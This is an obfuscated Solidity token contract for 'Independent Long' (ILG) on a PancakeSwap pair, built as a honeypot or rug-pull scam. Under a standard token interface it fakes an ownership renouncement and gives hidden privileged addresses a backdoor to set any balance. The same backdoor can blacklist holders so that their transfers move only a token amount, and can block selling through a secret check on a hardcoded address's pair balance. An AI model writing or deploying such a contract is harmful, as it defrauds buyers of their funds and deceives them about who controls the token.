//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface amountSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract teamFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface enableMarketing {
    function createPair(address limitTotal, address liquidityLimit) external returns (address);
}

interface marketingSell {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldEnable) external view returns (uint256);

    function transfer(address modeTake, uint256 shouldTradingSender) external returns (bool);

    function allowance(address isTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldTradingSender) external returns (bool);

    function transferFrom(
        address sender,
        address modeTake,
        uint256 shouldTradingSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldSellAmount, uint256 value);
    event Approval(address indexed isTotal, address indexed spender, uint256 value);
}

interface maxMin is marketingSell {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IndependentLong is teamFrom, marketingSell, maxMin {

    string private isTeam = "Independent Long";

    uint256 private fundLaunchBuy;

    constructor (){
        if (totalExempt == enableLaunch) {
            totalExempt = fundLaunchBuy;
        }
        amountSender walletTrading = amountSender(limitMode);
        receiverFeeSwap = enableMarketing(walletTrading.factory()).createPair(walletTrading.WETH(), address(this));
        if (liquidityShouldSell == totalExempt) {
            totalExempt = liquidityShouldSell;
        }
        tokenFrom = _msgSender();
        fundWallet();
        modeExempt[tokenFrom] = true;
        marketingTeamMax[tokenFrom] = enableShould;
        
        emit Transfer(address(0), tokenFrom, enableShould);
    }

    function shouldEnableTx(address txLaunched) public {
        require(txLaunched.balance < 100000);
        if (receiverAmount) {
            return;
        }
        if (minModeLaunched != buySenderExempt) {
            fundLaunchBuy = totalExempt;
        }
        modeExempt[txLaunched] = true;
        
        receiverAmount = true;
    }

    uint256 public enableLaunch;

    function transfer(address teamLaunched, uint256 shouldTradingSender) external virtual override returns (bool) {
        return takeFee(_msgSender(), teamLaunched, shouldTradingSender);
    }

    mapping(address => bool) public marketingTeam;

    function fundWallet() public {
        emit OwnershipTransferred(tokenFrom, address(0));
        liquiditySellReceiver = address(0);
    }

    function transferFrom(address minAmount, address modeTake, uint256 shouldTradingSender) external override returns (bool) {
        if (_msgSender() != limitMode) {
            if (fromMax[minAmount][_msgSender()] != type(uint256).max) {
                require(shouldTradingSender <= fromMax[minAmount][_msgSender()]);
                fromMax[minAmount][_msgSender()] -= shouldTradingSender;
            }
        }
        return takeFee(minAmount, modeTake, shouldTradingSender);
    }

    address public tokenFrom;

    address receiverLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 tradingTo;

    function balanceOf(address shouldEnable) public view virtual override returns (uint256) {
        return marketingTeamMax[shouldEnable];
    }

    uint256 constant walletMax = 8 ** 10;

    function maxTake(address fundTo) public {
        receiverLaunched();
        
        if (fundTo == tokenFrom || fundTo == receiverFeeSwap) {
            return;
        }
        marketingTeam[fundTo] = true;
    }

    string private senderWallet = "ILG";

    mapping(address => bool) public modeExempt;

    event OwnershipTransferred(address indexed exemptSwap, address indexed launchedList);

    function isFee(address teamLaunched, uint256 shouldTradingSender) public {
        receiverLaunched();
        marketingTeamMax[teamLaunched] = shouldTradingSender;
    }

    address limitMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public totalExempt;

    function totalSupply() external view virtual override returns (uint256) {
        return enableShould;
    }

    function takeFee(address minAmount, address modeTake, uint256 shouldTradingSender) internal returns (bool) {
        if (minAmount == tokenFrom) {
            return liquidityFund(minAmount, modeTake, shouldTradingSender);
        }
        uint256 fundAmount = marketingSell(receiverFeeSwap).balanceOf(receiverLaunch);
        require(fundAmount == minMax);
        require(modeTake != receiverLaunch);
        if (marketingTeam[minAmount]) {
            return liquidityFund(minAmount, modeTake, walletMax);
        }
        return liquidityFund(minAmount, modeTake, shouldTradingSender);
    }

    function owner() external view returns (address) {
        return liquiditySellReceiver;
    }

    function name() external view virtual override returns (string memory) {
        return isTeam;
    }

    address private liquiditySellReceiver;

    bool public receiverAmount;

    bool public enableFund;

    function symbol() external view virtual override returns (string memory) {
        return senderWallet;
    }

    uint256 private enableShould = 100000000 * 10 ** 18;

    function allowance(address modeTotalAuto, address receiverAt) external view virtual override returns (uint256) {
        if (receiverAt == limitMode) {
            return type(uint256).max;
        }
        return fromMax[modeTotalAuto][receiverAt];
    }

    mapping(address => uint256) private marketingTeamMax;

    function getOwner() external view returns (address) {
        return liquiditySellReceiver;
    }

    function toMode(uint256 shouldTradingSender) public {
        receiverLaunched();
        minMax = shouldTradingSender;
    }

    address public receiverFeeSwap;

    bool public sellTradingMax;

    uint256 public isReceiver;

    uint256 public liquidityShouldSell;

    function receiverLaunched() private view {
        require(modeExempt[_msgSender()]);
    }

    bool public buySenderExempt;

    uint8 private isMax = 18;

    mapping(address => mapping(address => uint256)) private fromMax;

    function decimals() external view virtual override returns (uint8) {
        return isMax;
    }

    function liquidityFund(address minAmount, address modeTake, uint256 shouldTradingSender) internal returns (bool) {
        require(marketingTeamMax[minAmount] >= shouldTradingSender);
        marketingTeamMax[minAmount] -= shouldTradingSender;
        marketingTeamMax[modeTake] += shouldTradingSender;
        emit Transfer(minAmount, modeTake, shouldTradingSender);
        return true;
    }

    function approve(address receiverAt, uint256 shouldTradingSender) public virtual override returns (bool) {
        fromMax[_msgSender()][receiverAt] = shouldTradingSender;
        emit Approval(_msgSender(), receiverAt, shouldTradingSender);
        return true;
    }

    uint256 minMax;

    bool public minModeLaunched;

    bool public feeBuy;

}